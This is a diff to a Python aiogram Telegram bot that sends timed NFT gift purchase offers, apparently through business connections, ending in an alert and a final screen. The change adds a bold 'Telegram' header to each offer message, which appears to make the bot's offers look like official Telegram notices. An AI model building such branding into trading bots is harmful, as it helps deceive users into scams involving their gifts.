@@ -1,8 +1,10 @@
 import asyncio
+import html
 import logging
 import os
 import re
 import time
+from datetime import datetime, timezone
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
@@ -50,6 +52,7 @@ TEXTS = {
             "⚠️ <b>Неверная ссылка на NFT.</b>\n\n"
             "Формат: <code>https://t.me/nft/Название-Номер</code>"
         ),
+        "header": "Telegram",
         "offer": "Пользователь предлагает вам",
         "for_gift": "за подарок",
         "valid_for": "Оффер действителен ещё",
@@ -91,6 +94,7 @@ TEXTS = {
             "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>"
         ),
         "invalid_link": "⚠️ <b>Invalid NFT link.</b>",
+        "header": "Telegram",
         "offer": "A user offers you",
         "for_gift": "for the gift",
         "valid_for": "Offer valid for another",
@@ -127,31 +131,6 @@ TEXTS = {
 }
 
 
-# ================= ПЕРЕВОД ВАЛЮТ =================
-CURRENCY_NAMES = {
-    "ru": {
-        "STARS": "Звёзд",
-        "STAR": "Звёзд",
-        "TON": "TON",
-        "GRAM": "GRAM",
-        "USDT": "USDT",
-        "BTC": "BTC",
-    },
-    "en": {
-        "STARS": "Stars",
-        "STAR": "Stars",
-        "TON": "TON",
-        "GRAM": "GRAM",
-        "USDT": "USDT",
-        "BTC": "BTC",
-    },
-}
-
-
-def format_currency(currency, lang="ru"):
-    return CURRENCY_NAMES.get(lang, {}).get(currency.upper(), currency.upper())
-
-
 # ================= ПАРСИНГ =================
 NFT_LINK_RE = re.compile(r"t\.me/nft/(.+?)-(\d+)(?:\?|$|/)")
 
@@ -185,12 +164,12 @@ def format_time_left(seconds_left):
     return f"{minutes} мин."
 
 
-def build_offer_text(t, nft_title, amount, currency, nft_link, seconds_left, lang="ru"):
-    cur = format_currency(currency, lang)
+def build_offer_text(t, nft_title, amount, currency, nft_link, seconds_left):
     return (
+        f"<b>{t['header']}</b>\n"
+        f"<b>{nft_title}</b>\n\n"
         f"{t['offer']}\n"
-        f"<b>{amount} {cur}</b> {t['for_gift']} "
-        f"<a href=\"{nft_link}\">{nft_title}</a>.\n\n"
+        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
         f"{t['valid_for']} {format_time_left(seconds_left)}."
     )
 
@@ -232,7 +211,6 @@ async def offer_timer(deal_id: str):
     if not deal:
         return
     t = TEXTS.get(deal["lang"], TEXTS["ru"])
-    lang = deal["lang"]
 
     try:
         while True:
@@ -262,7 +240,7 @@ async def offer_timer(deal_id: str):
             try:
                 text = build_offer_text(
                     t, deal["title"], deal["amount"], deal["currency"],
-                    deal["link"], seconds_left, lang,
+                    deal["link"], seconds_left,
                 )
                 kb = build_offer_keyboard(t, deal_id, deal["lang"]).as_markup()
                 if deal["bc_id"]:
@@ -381,7 +359,7 @@ async def process_buy(message: Message, bc_id):
         "expires_at": expires_at,
     }
 
-    text = build_offer_text(t, nft_title, amount, currency, nft_link, OFFER_TTL_SECONDS, lang)
+    text = build_offer_text(t, nft_title, amount, currency, nft_link, OFFER_TTL_SECONDS)
     kb = build_offer_keyboard(t, deal_id, lang).as_markup()
 
     try:
@@ -463,9 +441,13 @@ async def process_accept(cb: CallbackQuery):
 
     stop_timer(deal_id)
 
+    # Алерт с «Внимание!»
     await cb.answer(text=t["alert_title"], show_alert=True)
+
+    # Пауза 2 секунды (пока пользователь читает алерт)
     await asyncio.sleep(2)
 
+    # Финальный экран
     text = build_final_text(t, deal)
     kb = build_final_keyboard(t, deal, deal_id, lang).as_markup()
 
